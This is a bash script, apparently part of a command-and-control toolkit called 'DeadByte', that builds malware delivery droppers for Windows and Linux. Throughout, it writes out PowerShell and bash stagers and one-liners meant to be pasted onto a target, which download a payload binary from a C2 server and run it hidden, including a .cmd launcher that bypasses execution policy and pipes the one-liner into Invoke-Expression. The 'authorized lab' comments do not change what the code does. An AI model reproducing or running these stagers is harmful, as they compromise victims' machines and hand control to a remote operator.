#!/usr/bin/env bash
# =====================================================================
# Generates delivery scripts with the REAL blob embedded (no literal <BLOB>).
# Usage:
#   bash scripts/gen-delivery.sh              # builds win + linux
#   bash scripts/gen-delivery.sh win          # Windows only
#   bash scripts/gen-delivery.sh linux        # Linux only
#   bash scripts/gen-delivery.sh --print      # prints one-liners to stdout
# =====================================================================
set -euo pipefail
cd "$(dirname "$0")/.."
ROOT="$(pwd)"
DIST="$ROOT/dist"
OUT="$ROOT/delivery/out"
mkdir -p "$OUT"

PORT="${PORT:-8443}"
ADMIN_TOKEN="${ADMIN_TOKEN:-change-me-admin-token}"
BEACON_TOKEN="${BEACON_TOKEN:-change-me-beacon-token}"
DETECTED_IP="$(hostname -I 2>/dev/null | awk '{print $1}')" || true
C2_IP="${C2_IP:-${DETECTED_IP:-192.0.2.10}}"
C2_URL="${C2_URL:-http://$C2_IP:$PORT}"

TARGET="${1:-all}"
PRINT=0
[ "${1:-}" = "--print" ] && { PRINT=1; TARGET=all; }
[ "${2:-}" = "--print" ] && PRINT=1

say(){ printf '\033[1;32m[+] %s\033[0m\n' "$*"; }
die(){ printf '\033[1;31m[x] %s\033[0m\n' "$*"; exit 1; }

# payload host (generates the blob)
GOOS_L="$(uname -s | tr 'A-Z' 'a-z')"
GOARCH_L="$(uname -m)"
case "$GOARCH_L" in x86_64|amd64) GOARCH_L=amd64;; aarch64|arm64) GOARCH_L=arm64;; esac
PAY="$DIST/deadbyte-payload-$GOOS_L-$GOARCH_L"
[ -x "$PAY" ] || PAY="$DIST/deadbyte-payload-linux-amd64"
[ -x "$PAY" ] || die "payload host binary not found in dist/ - run setup first"

# pubkey from the live C2 (required)
PUBJSON="$(curl -sf "$C2_URL/api/v1/key/public" 2>/dev/null)" \
  || PUBJSON="$(curl -sf "http://127.0.0.1:$PORT/api/v1/key/public" 2>/dev/null)" \
  || true
PUBKEY="$(printf '%s' "$PUBJSON" | sed -E 's/.*"public_key":"([^"]+)".*/\1/')" || true
if [ -z "$PUBKEY" ] || [ "$PUBKEY" = "$PUBJSON" ]; then
  [ -f "$ROOT/.pubkey.txt" ] && PUBKEY="$(grep -oE '[A-Za-z0-9+/=]{40,}' "$ROOT/.pubkey.txt" | head -1)" || true
fi
[ -n "$PUBKEY" ] || die "C2 offline and no .pubkey.txt - start the C2 (menu option 2) and try again"

# REAL blob: auto-discovery (no -dirs) + panel note-url
BLOB="$("$PAY" -config-gen \
  -c2 "$C2_URL" \
  -pubkey "$PUBKEY" \
  -token "$BEACON_TOKEN" \
  -note-url "$C2_URL" 2>/dev/null)" || true
[ -n "$BLOB" ] || die "config-gen failed (invalid pubkey?)"
# sanitize: never accept a placeholder
case "$BLOB" in *'<'*|*'>'*|*BLOB*) die "suspicious blob contains a placeholder: $BLOB";; esac

say "blob generated (${#BLOB} chars)  c2=$C2_URL  pub=${PUBKEY:0:16}..."

# ---------- Windows: .ps1 completo + one-liner ----------
if [ "$TARGET" = "all" ] || [ "$TARGET" = "win" ] || [ "$TARGET" = "windows" ]; then
  cat > "$OUT/win.ps1" << PSEOF
# DeadByte - Windows delivery (embedded blob - do NOT edit -config)
# Authorized lab. Run as a REGULAR user (not Admin), normal PowerShell:
#   powershell -ExecutionPolicy Bypass -File win.ps1
\$ErrorActionPreference = 'Stop'
\$C2 = '$C2_URL'
\$Tok = '$ADMIN_TOKEN'
\$Blob = '$BLOB'
\$Log = Join-Path \$env:TEMP 'deadbyte.log'
\$Name = 'svc-' + (Get-Random -Maximum 99999) + '.exe'
\$Dest = Join-Path \$env:TEMP \$Name
if (\$Blob -match '<|>|BLOB' -or [string]::IsNullOrWhiteSpace(\$Blob)) {
  Write-Host 'ERROR: invalid/placeholder blob. Regenerate on Kali (menu > generate delivery).' -ForegroundColor Red
  exit 1
}
try {
  Invoke-WebRequest -Uri "\$C2/artifacts/deadbyte-payload-windows-amd64.exe" \`
    -Headers @{ Authorization = "Bearer \$Tok" } -OutFile \$Dest -UseBasicParsing
} catch {
  Write-Host "download ERROR: \$(\$_.Exception.Message)" -ForegroundColor Red
  Write-Host "Is the C2 reachable? \$C2  firewall open?" -ForegroundColor Yellow
  exit 1
}
\$args = @('-config', \$Blob, '-force', '-verbose', '-log-file', \$Log)
Start-Process -FilePath \$Dest -ArgumentList \$args -WindowStyle Hidden
Write-Host "ok. log: \$Log   (Get-Content \$Log -Wait)"
PSEOF

  # one-liner: paste directly into the target's PowerShell (no file)
  ONELINER_WIN="\$ErrorActionPreference='Stop';\$u='$C2_URL';\$t='$ADMIN_TOKEN';\$b='$BLOB';if(\$b -match '<|>|BLOB'){Write-Host 'INVALID BLOB' -ForegroundColor Red;exit 1};\$p=Join-Path \$env:TEMP ('svc-'+ (Get-Random)+'.exe');\$l=Join-Path \$env:TEMP 'deadbyte.log';try{Invoke-WebRequest -Uri \"\$u/artifacts/deadbyte-payload-windows-amd64.exe\" -Headers @{Authorization=\"Bearer \$t\"} -OutFile \$p -UseBasicParsing}catch{Write-Host \$_.Exception.Message -ForegroundColor Red;exit 1};Start-Process \$p -ArgumentList @('-config',\$b,'-force','-verbose','-log-file',\$l) -WindowStyle Hidden;Write-Host \"ok log=\$l\""
  printf '%s\n' "$ONELINER_WIN" > "$OUT/win-oneliner.txt"

  # .cmd launcher (double-click / cmd.exe)
  cat > "$OUT/win.cmd" << CMDEOF
@echo off
REM DeadByte lab - runs the one-liner via hidden PowerShell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "Get-Content -Raw '%~dp0win-oneliner.txt' | Invoke-Expression"
CMDEOF

  say "Windows: $OUT/win.ps1"
  say "Windows: $OUT/win-oneliner.txt  (paste into the target's PowerShell)"
  say "Windows: $OUT/win.cmd"
fi

# ---------- Linux: .sh + one-liner ----------
if [ "$TARGET" = "all" ] || [ "$TARGET" = "linux" ]; then
  cat > "$OUT/linux.sh" << LSEOF
#!/usr/bin/env bash
# DeadByte - Linux delivery (embedded blob). Authorized lab.
#   bash linux.sh
set -euo pipefail
C2='$C2_URL'
TOK='$ADMIN_TOKEN'
BLOB='$BLOB'
LOG="\${LOG_FILE:-/tmp/deadbyte.log}"
case "\$(uname -m)" in
  x86_64|amd64) BIN=deadbyte-payload-linux-amd64 ;;
  aarch64|arm64) BIN=deadbyte-payload-linux-arm64 ;;
  *) echo "unsupported arch: \$(uname -m)" >&2; exit 1 ;;
esac
if echo "\$BLOB" | grep -qE '<|>|BLOB'; then
  echo "ERROR: invalid/placeholder blob. Regenerate on Kali." >&2; exit 1
fi
TMP="\$(mktemp)"
curl -fsSL -H "Authorization: Bearer \$TOK" -o "\$TMP" "\$C2/artifacts/\$BIN"
chmod +x "\$TMP"
nohup "\$TMP" -config "\$BLOB" -force -verbose -log-file "\$LOG" >/dev/null 2>&1 &
echo "ok. log: \$LOG   (tail -f \$LOG)"
LSEOF
  chmod +x "$OUT/linux.sh"

  ONELINER_LIN="C2='$C2_URL';T='$ADMIN_TOKEN';B='$BLOB';L=/tmp/deadbyte.log;case \$(uname -m) in x86_64|amd64) BIN=deadbyte-payload-linux-amd64;; aarch64|arm64) BIN=deadbyte-payload-linux-arm64;; *) echo arch;exit 1;;esac;echo \"\$B\"|grep -qE '<|>|BLOB' && { echo INVALID_BLOB;exit 1; };P=\$(mktemp);curl -fsSL -H \"Authorization: Bearer \$T\" -o \"\$P\" \"\$C2/artifacts/\$BIN\" && chmod +x \"\$P\" && nohup \"\$P\" -config \"\$B\" -force -verbose -log-file \"\$L\" >/dev/null 2>&1 & echo ok log=\$L"
  printf '%s\n' "$ONELINER_LIN" > "$OUT/linux-oneliner.txt"

  say "Linux:   $OUT/linux.sh"
  say "Linux:   $OUT/linux-oneliner.txt"
fi

# manifest
cat > "$OUT/README.txt" << MEOF
DEADBYTE delivery pack - generated on $(date '+%Y-%m-%d %H:%M')
C2:     $C2_URL
pubkey: $PUBKEY
admin:  $ADMIN_TOKEN
beacon: $BEACON_TOKEN
blob:   ${#BLOB} chars (embedded in the scripts - do NOT use the literal text <BLOB>)

WINDOWS (on the target, NORMAL PowerShell - not Admin):
  1) copy win-oneliner.txt and paste it whole into PowerShell, OR
  2) copy win.ps1 and:  powershell -ExecutionPolicy Bypass -File win.ps1
  3) follow along:  Get-Content \$env:TEMP\deadbyte.log -Wait

LINUX (on the target):
  1) bash linux.sh
  2) or paste linux-oneliner.txt
  3) tail -f /tmp/deadbyte.log

If "nothing happens": the log at %TEMP%\deadbyte.log (or /tmp/deadbyte.log) shows FATAL.
Historical cause #1: passing the literal text <BLOB> instead of the generated blob.
MEOF

if [ "$PRINT" = "1" ]; then
  echo
  echo "========== WINDOWS ONE-LINER (paste into the target's PowerShell) =========="
  cat "$OUT/win-oneliner.txt" 2>/dev/null || true
  echo
  echo "========== LINUX ONE-LINER =========="
  cat "$OUT/linux-oneliner.txt" 2>/dev/null || true
  echo
fi

say "pack in $OUT/"
echo "$BLOB" > "$OUT/.blob"
echo "$PUBKEY" > "$OUT/.pubkey"
echo "$C2_URL" > "$OUT/.c2url"
